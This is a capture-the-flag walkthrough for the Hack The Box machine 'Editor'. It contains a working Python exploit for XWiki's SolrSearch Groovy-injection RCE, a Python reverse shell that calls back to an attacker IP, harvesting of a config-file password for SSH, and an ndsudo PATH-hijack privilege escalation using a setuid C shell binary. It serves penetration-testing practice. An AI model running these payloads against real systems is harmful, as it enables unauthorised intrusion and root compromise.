---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - Ndsudo
  - XWiki
---
# Overview

| Name        | Editor    |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ sudo nmap -sC -sV 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 02:38 PDT
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan:
|   Server Type: Jetty(10.0.20)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In port `80`, there is `SimplistCode` tool which I downloaded (had nothing) and if we click in `docs` we redirect to `http://wiki.editor.htb/xwik` which I added in hostfile. Subdomain and directory enumeration gave nothing.

![[editor.png]]

`http://editor.htb:8080/` also leads to same site as in `wiki.editor.htb/` (Sometimes it shows `XWiki is initializing (50%)...`) prolly setup. Both site seemed same to went to `wiki` one.

**XWiki** is a [free](https://en.wikipedia.org/wiki/Free_software "Free software") and [open source](https://en.wikipedia.org/wiki/Open_source "Open source") [wiki software](https://en.wikipedia.org/wiki/Wiki_software "Wiki software") platform written in [Java](https://en.wikipedia.org/wiki/Java_\(programming_language\) "Java (programming language)") with a design emphasis on extensibility. XWiki allows for the storing of structured data and the execution of server-side script within the wiki interface. Scripting languages including [Velocity](https://en.wikipedia.org/wiki/Apache_Velocity "Apache Velocity"), [Apache Groovy](https://en.wikipedia.org/wiki/Apache_Groovy "Apache Groovy"), [Python](https://en.wikipedia.org/wiki/Python_\(programming_language\) "Python (programming language)"), [Ruby](https://en.wikipedia.org/wiki/Ruby_\(programming_language\) "Ruby (programming language)") and [PHP](https://en.wikipedia.org/wiki/PHP "PHP") can be written directly into wiki pages using wiki macros.

![[editor2.png]]

![[editor3.png]]
# Exploitation
## XWiki Platform 15.10.10 - Remote Code Execution - CVE-2025-24893  

We got version `XWiki Debian 15.10.8`, searched for exploit got this [Exploit](https://www.exploit-db.com/exploits/52136). The `SolrSearch` RSS endpoint (`/bin/get/Main/SolrSearch?media=rss&text=...`) is vulnerable to **Groovy macro injection**. Through this endpoint, attacker-controlled input is interpreted as Groovy code executed **server-side**. By injecting Groovy code in a structured **XWiki macro syntax**, the attacker can run arbitrary system commands:
 
```groovy
{{async async=false}}
  {{groovy}}
    println(["/bin/sh", "-c", "id"].execute().text)
  {{/groovy}}
{{/async}}

```

This code:

- Uses XWiki's `{{groovy}}...{{/groovy}}` macro to execute Groovy code.
- Runs `/bin/sh -c "id"` to execute the `id` shell command.
- Wraps it in `{{async}}` to avoid asynchronous rendering.

But in actual it gets passed as URL-Encoded.

Here is cleaned up exploit:

```python
import requests
import re
import urllib.parse
import html  
from bs4 import BeautifulSoup
import html
import xml.etree.ElementTree as ET
import re

def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)


def clean_output(html_text):
    # Parse the HTML to extract the escaped XML inside <p>
    soup = BeautifulSoup(html_text, 'html.parser')
    p_tag = soup.find('p')
    if not p_tag:
        return "No <p> tag found in response."

    escaped_xml = p_tag.get_text()  # Get the escaped XML string
    xml_text = html.unescape(escaped_xml)  # Unescape HTML entities

    try:
        root = ET.fromstring(xml_text)
        title = root.find('./channel/title')
        if title is not None:
            # Extract output from title text pattern [}}}output]
            match = re.search(r'\[}}}(.*)\]', title.text)
            if match:
                return match.group(1).strip()
            return title.text.strip()
        else:
            return "No <title> found in RSS feed."
    except ET.ParseError:
        return "Failed to parse XML inside <p>."

def exploit(target_url, command):
    # **Important**: Do NOT encode the command here — pass it raw so Groovy executes correctly
    # Just escape double quotes inside the command to avoid breaking the Groovy string
    safe_cmd = command.replace('"', '\\"')

    payload = (
        "%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d"
        f"%7b%7bgroovy%7d%7dprintln([%22/bin/sh%22,%20%22-c%22,%20%22{safe_cmd}%22].execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    )


    full_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text={payload}"

    try:
        print(f"[+] Sending request to: {full_url}")
        response = requests.get(full_url, timeout=10)

        if response.status_code == 200:
            print("[✔] Request sent successfully! Output:\n")
            print("-" * 60)
            print(clean_output(response.text))
            print("-" * 60)
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

if __name__ == "__main__":
    target = input("[?] Enter the target URL (without http/https): ").strip()
    target_url = detect_protocol(target.replace("http://", "").replace("https://", "").strip())

    while True:
        cmd = input("[?] Enter the shell command to execute (or type 'exit' to quit): ").strip()
        if cmd.lower() in ('exit', 'quit'):
            print("Exiting.")
            break
        exploit(target_url, cmd)

```

Dont forget to put `/xwiki` in URL.

```powershell
PS C:\Users\At0m\AppData\Local\Programs\Python\Python314> .\python.exe main.py
[?] Enter the target URL (without http/https): http://wiki.editor.htb:8080/xwiki
[!] HTTPS not available, falling back to HTTP.
[✔] Target supports HTTP: http://wiki.editor.htb:8080/xwiki
[?] Enter the shell command to execute (or type 'exit' to quit): id
[+] Sending request to: http://wiki.editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln([%22/bin/sh%22,%20%22-c%22,%20%22id%22].execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✔] Request sent successfully! Output:

------------------------------------------------------------
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
------------------------------------------------------------
[?] Enter the shell command to execute (or type 'exit' to quit): python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.73",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash"])'
[+] Sending request to: http://wiki.editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln([%22/bin/sh%22,%20%22-c%22,%20%22python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.73\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\"])'%22].execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
[✖] Request timed out. Target is slow or unresponsive.
[?] Enter the shell command to execute (or type 'exit' to quit):
```

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.73",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash"])'
```

```powershell
PS C:\Users\At0m\Temp\nc.exe> .\nc.exe -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.73] from editor.htb [10.10.11.80] 45408
ls
jetty
logs
start.d
start_xwiki.bat
start_xwiki_debug.bat
start_xwiki_debug.sh
start_xwiki.sh
stop_xwiki.bat
stop_xwiki.sh
webapps
python3 -c 'import pty; pty.spawn("/bin/bash")'
xwiki@editor:/home$ cd oliver
cd oliver
bash: cd: oliver: Permission denied
xwiki@editor:/home$
```
## Enumerating

Upon Enumeration, We get creds on `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`.

```xml
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
```

Password is `xwiki:theEd1t0rTeam99` but user SSH to `xwiki` doesn't work so I tried as `oliver`.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/c/Users/At0m/Temp]
└─$ ssh oliver@10.10.11.80
oliver@10.10.11.80 password:

oliver@editor:~$ ls
fakebin  linpeas.sh  malicious.c  megacli  nvme  user.txt
oliver@editor:~$ cat user.txt
<REDACTED>
```
# Privilege Escalation

```bash
oliver@editor:/tmp$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

We can look at process running from `netdata`.

```bash
oliver@editor:/tmp$ ps aux | grep netdata oliver 277467 0.0 0.0 8248 3884 pts/14 S+ 16:15 0:00 strace -f /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
## `ndsudo`: Local Privilege Escalation via Untrusted Search Path

Saw this [CVE](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) of `nsudo`.

```bash
oliver@editor:/tmp$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

As we can see it has SUID bit set.

The `ndsudo` tool is packaged as a `root`-owned executable with the SUID bit set.  
It only runs a restricted set of external commands, but its search paths are supplied by the `PATH` environment variable. This allows an attacker to control where `ndsudo` looks for these commands, which may be a path the attacker has write access to.

As a user that has permission to run `ndsudo`:

1. Place an executable with a name that is on `ndsudo`’s list of commands (e.g. `nvme`) in a writable path. (An **NVMe device** is a **type of high-speed storage** device that uses the **Non-Volatile Memory Express (NVMe)** protocol to communicate with a computer’s CPU over a **PCIe (Peripheral Component Interconnect Express)** interface.)
2. Set the `PATH` environment variable so that it contains this path
3. Run `ndsudo` with a command that will run the aforementioned executable

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

I used this exploit, compiled it in Attack machine and sent to `/tmp` with `scp`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

It changes the process's user and group ID to `0` (root) using `setuid(0)` and `setgid(0)`, then uses `execl` to execute `/bin/bash`, effectively giving the user a root shell. 

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ cat exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ gcc -o exploit exploit.c

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ scp exploit oliver@editor.htb:/tmp
oliver@editor.htb's password:
```

```bash
oliver@editor:/tmp$ mv exploit /tmp/nvme && chmod +x /tmp/nvme
```

```bash
oliver@editor:/tmp$ export PATH=/tmp:$PATH
```

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/tmp# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
root@editor:/tmp# cd /root
root@editor:/root# cat root.txt
<REDACTED>
```

---
